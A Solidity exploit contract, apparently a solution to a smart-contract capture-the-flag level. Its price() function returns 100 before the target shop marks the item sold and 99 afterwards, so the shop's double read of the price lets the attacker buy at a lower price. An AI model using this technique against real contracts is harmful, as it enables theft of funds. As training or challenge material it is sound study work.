pragma solidity ^0.8;

interface IShop {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
}

contract Hack {
    IShop private immutable target;

    constructor(address _target) {
        target = IShop(_target);
    }

    function pwn() external {
        target.buy();
        require(target.price() == 99, "price != 99");
    }

    function price() external view returns (uint256) {
        if (target.isSold()) {
            return 99;
        }
        return 100;
    }
}
